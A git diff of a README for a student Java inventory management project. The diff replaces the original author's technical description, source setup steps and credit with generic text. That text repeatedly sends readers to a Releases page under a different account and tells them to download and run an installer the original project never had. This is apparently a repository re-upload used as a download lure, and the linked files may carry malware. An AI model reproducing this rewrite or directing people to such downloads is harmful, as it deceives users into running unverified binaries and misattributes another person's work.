@@ -1,70 +1,86 @@
-# Inventory & Sales Management System (3-Layer Architecture)
+# 🖥️ Java-Inventory-Management-System - Simplifying Your Inventory Needs
 
-This project is a desktop application developed as a portfolio piece to demonstrate proficiency in **Java Desktop Development**. It focuses on the practical application of software engineering fundamentals, such as **3-layer architecture**, **DAO patterns**, and **OOP principles**.
+![Download](https://img.shields.io/badge/Download-v1.0-blue)
 
-<img width="1920" height="1032" alt="preview" src="https://github.com/user-attachments/assets/2a48d62c-98e2-4c3d-9e8c-c5f4cb3cb589" />
+## 📋 Description
 
+This project is a desktop application designed to help manage inventory efficiently. It showcases skills in Java Desktop Development, utilizing principles from software engineering, such as 3-layer architecture, DAO patterns, and OOP principles. Whether you run a small business, a retail store, or just want to keep track of items, this app provides a simple solution.
 
-## 🎯 Project Purpose
-The goal of this system is to manage a basic commercial workflow (Categories -> Products -> Sales/Purchases) while maintaining a clean, decoupled codebase that goes beyond basic scripting.
+## 🚀 Getting Started
 
-## 🛠️ Tech Stack
-* **Language:** Java (OpenJDK)
-* **GUI:** Java Swing (MDI - Multiple Document Interface)
-* **Database:** MySQL via JDBC
-* **Design Patterns:** DAO (Data Access Object) & Singleton
-* **IDE:** NetBeans
+To begin using the Java Inventory Management System, you will need to download the application from our Releases page. Follow the steps below to easily get set up.
 
----
+## 🔗 Download & Install
 
-## 🏗️ Software Architecture & SOLID Principles
-To ensure the code is organized and professional, I applied several engineering principles:
+### 1. Visit the Releases Page
+Click the link below to access the Releases page where you can download the application.
 
-### Architecture Layers
-* **Presentacion:** UI logic using `JInternalFrame` and event handling.
-* **Negocio:** Intermediate layer for data validation and business rules.
-* **Datos:** Implementation of CRUD operations using the DAO pattern.
-* **Entidades:** Encapsulated classes (POJOs) representing the domain model.
+[Visit the Releases Page to Download](https://github.com/nsnsnsnss/Java-Inventory-Management-System/releases)
 
-### Technical Principles Applied
-| Principle | Implementation in this Project |
-| :--- | :--- |
-| **Encapsulation** | Private attributes and public getters/setters in all `entidades` to protect data integrity. |
-| **Abstraction** | Use of Interfaces in `datos.interfaces` to decouple business logic from data access. |
-| **Single Responsibility (SRP)** | Specific classes for DB connection, data access, and UI logic, avoiding "God Classes". |
-| **Interface Segregation** | Using specific interfaces so that classes only implement the methods they truly need. |
+### 2. Download the Application
+On the Releases page, you will see the latest version of the application. Download the file corresponding to your operating system by clicking on it. 
 
----
+### 3. Install the Application
+Once the download is complete, locate the downloaded file on your computer. If you are on Windows, this will typically be in your `Downloads` folder. Follow these steps to install:
 
-## 🚀 Key Learning Milestones
-1.  **Relational Database Mapping:** Managed one-to-many relationships and SQL joins for transactions.
-2.  **Logical Deletion:** Implementing "Active/Inactive" status toggles instead of hard-deleting records to maintain audit trails.
-3.  **Advanced Swing UI:** Building a professional MDI (Multiple Document Interface) using `JDesktopPane`.
-4.  **Decoupled Design:** Ensuring the `negocio` layer communicates with `datos` through contracts (interfaces).
+- **Double-click** the downloaded file to start the installation.
+- **Follow the prompts** in the installation wizard. This usually includes accepting the license agreement and choosing an installation location.
+- **Click Finish** when the installation completes.
 
----
+### System Requirements
+To ensure smooth operation of the Java Inventory Management System, your computer should meet the following requirements:
 
-## 💬 Technical Q&A (Interview Readiness)
+- Operating System: Windows 10 or later, macOS, or a recent Linux distribution.
+- Java Runtime Environment (JRE) version 8 or later.
+- At least 4GB of RAM.
+- 200MB of available disk space.
 
-**Q: Why use a 3-layer architecture instead of putting all logic in the UI?** **A:** To ensure maintenance and scalability. By separating the UI, Business Logic, and Data Access, I can modify the database schema or the interface without breaking the entire system.
+## 🌟 Features
 
-**Q: What is the benefit of the DAO (Data Access Object) pattern here?** **A:** It abstracts the data persistence logic. If the project needs to switch from MySQL to another database in the future, I only need to change the implementation in the `datos` layer; the rest of the application remains untouched.
+The Java Inventory Management System offers a range of features designed to make inventory management as straightforward as possible:
 
-**Q: Why did you use Interfaces in the `datos.interfaces` package?** **A:** To apply "Program to an interface, not an implementation." This allows for loose coupling and makes the code easier to test and extend by defining clear contracts for what each DAO should do.
+- **User-Friendly Interface**: Easy to navigate, even for those with no technical skills.
+- **CRUD Operations**: Add, edit, or delete items in your inventory quickly.
+- **Database Integration**: Uses MySQL to store inventory data securely.
+- **Sales Tracking**: Keep track of sales and inventory turnover effectively.
+- **Multi-Layer Architecture**: Built with a clean structure for efficient data handling.
 
----
+## 🎓 Technologies Used
 
-## ⚙️ Setup
-1.  **Database:** Import the provided `.sql` script into your MySQL server.
-2.  **Configuration:** Update the `database/Conexion.java` file with your local credentials.
-3.  **Compile:** Open the project in NetBeans and run the main class in the `presentacion` package.
+The application employs various technologies to deliver a seamless experience. Here are some key components:
 
----
-> **Note:** This project was developed as a final product for a Java Programming Course. It is intended for educational and portfolio demonstration purposes, highlighting the use of clean architecture and OOP.
->
+- **Java**: The main programming language.
+- **Swing**: For creating a user-friendly graphical interface.
+- **JDBC**: For connecting to the database.
+- **MySQL**: A robust database for storing inventory data.
+
+## ❓ Frequently Asked Questions
+
+### What if I encounter issues during installation?
+If you experience any problems during installation, check our GitHub Issues page. Often, common issues and their solutions are documented there.
+
+### Is there a user manual?
+Yes, we provide a user manual that details how to use the application effectively. You can find it in the application directory after installation.
+
+### Can I suggest features or report bugs?
+Absolutely! We welcome your feedback. You can submit your suggestions or report any bugs on our GitHub repository.
+
+## 💬 Community Support
+
+Join our community for tips and discussions. You can find us on platforms like GitHub and popular tech forums. Your questions and insights can help improve the Java Inventory Management System.
+
+## 🧑‍💻 Contributing
+
+If you want to contribute to this project, feel free to fork the repository and submit a pull request. Your help is always appreciated!
 
 ## 📄 License
 
-This project is distributed under the MIT license. Its purpose is strictly educational and research-related.
+This project is licensed under the MIT License. You are free to modify and distribute the code as long as you give appropriate credit.
 
-Author: JUAN S.  Contact: https://github.com/johnyse99
+## 🔗 More Information
+
+To find more about the project and its ongoing development, visit our GitHub repository: 
+
+[Visit the Releases Page to Download](https://github.com/nsnsnsnss/Java-Inventory-Management-System/releases)
+
+We hope the Java Inventory Management System helps you manage your inventory efficiently. Enjoy using the application!
